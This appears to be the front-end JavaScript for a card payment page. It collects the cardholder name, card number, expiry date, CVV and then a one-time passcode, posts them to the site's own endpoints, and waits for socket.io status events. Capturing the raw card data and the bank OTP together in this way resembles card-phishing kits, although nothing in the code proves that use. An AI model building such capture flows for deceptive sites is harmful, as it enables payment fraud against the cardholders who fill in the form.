let socket;
let paymentData = null;

document.addEventListener('DOMContentLoaded', () => {
    // Initialize socket connection
    socket = io();
    
    // Get CSRF token
    fetch('/csrf-token')
        .then(response => response.json())
        .then(data => {
            document.getElementById('csrfToken').value = data.token;
            document.getElementById('otpCsrfToken').value = data.token;
        })
        .catch(error => showNotification('Error fetching CSRF token', 'error'));

    // Socket event listeners
    socket.on('payment_status', handlePaymentStatus);
    socket.on('otp_status', handleOTPStatus);
});

function submitCard() {
    const form = document.getElementById('cardForm');
    if (!form.checkValidity()) {
        form.reportValidity();
        return;
    }

    const formData = {
        holder: document.getElementById('cardHolder').value.trim(),
        number: document.getElementById('cardNumber').value.trim(),
        exp: document.getElementById('expDate').value.trim(),
        cvv: document.getElementById('cvv').value.trim(),
        page: '1',
        _csrf: document.getElementById('csrfToken').value
    };

    showLoading(true);

    fetch('/process-payment', {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json',
            'CSRF-Token': document.getElementById('csrfToken').value
        },
        body: JSON.stringify(formData)
    })
    .then(response => response.json())
    .then(data => {
        if (data.status === 'otp_required') {
            paymentData = formData;
            showOTPForm();
        } else {
            handlePaymentStatus(data);
        }
    })
    .catch(error => {
        showNotification('Error processing payment', 'error');
        showLoading(false);
    });
}

function submitOTP() {
    const otpForm = document.getElementById('otpForm');
    if (!otpForm.checkValidity()) {
        otpForm.reportValidity();
        return;
    }

    const otpData = {
        ...paymentData,
        otp: document.getElementById('otpCode').value.trim(),
        _csrf: document.getElementById('otpCsrfToken').value
    };

    showLoading(true);

    fetch('/verify-otp', {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json',
            'CSRF-Token': document.getElementById('otpCsrfToken').value
        },
        body: JSON.stringify(otpData)
    })
    .then(response => response.json())
    .then(handleOTPStatus)
    .catch(error => {
        showNotification('Error verifying OTP', 'error');
        showLoading(false);
    });
}

function handlePaymentStatus(data) {
    showLoading(false);
    if (data.status === 'success') {
        showNotification('Payment successful!', 'success');
        resetForms();
    } else if (data.status === 'error') {
        showNotification(data.message || 'Payment failed', 'error');
    }
}

function handleOTPStatus(data) {
    showLoading(false);
    if (data.status === 'success') {
        showNotification('Payment verified and completed!', 'success');
        hideOTPForm();
        resetForms();
    } else if (data.status === 'error') {
        showNotification(data.message || 'OTP verification failed', 'error');
    }
}

function showOTPForm() {
    document.getElementById('payment-form').style.display = 'none';
    document.getElementById('otp-form').style.display = 'block';
    document.getElementById('otpCode').value = '';
    showLoading(false);
}

function hideOTPForm() {
    document.getElementById('payment-form').style.display = 'block';
    document.getElementById('otp-form').style.display = 'none';
}

function resetForms() {
    document.getElementById('cardForm').reset();
    document.getElementById('otpForm').reset();
    hideOTPForm();
    paymentData = null;
}

function showLoading(show) {
    document.getElementById('loading').style.display = show ? 'flex' : 'none';
}

function showNotification(message, type) {
    const notification = document.getElementById('notification');
    notification.textContent = message;
    notification.className = `notification ${type}`;
    notification.style.display = 'block';

    setTimeout(() => {
        notification.style.display = 'none';
    }, 5000);
}

// Input formatting and validation
document.getElementById('cardNumber').addEventListener('input', function(e) {
    this.value = this.value.replace(/\D/g, '').substring(0, 16);
});

document.getElementById('expDate').addEventListener('input', function(e) {
    let value = this.value.replace(/\D/g, '');
    if (value.length >= 2) {
        value = value.substring(0, 2) + '/' + value.substring(2, 4);
    }
    this.value = value;
});

document.getElementById('cvv').addEventListener('input', function(e) {
    this.value = this.value.replace(/\D/g, '').substring(0, 3);
});

document.getElementById('cardHolder').addEventListener('input', function(e) {
    this.value = this.value.replace(/[^A-Za-z\s]/g, '');
}); 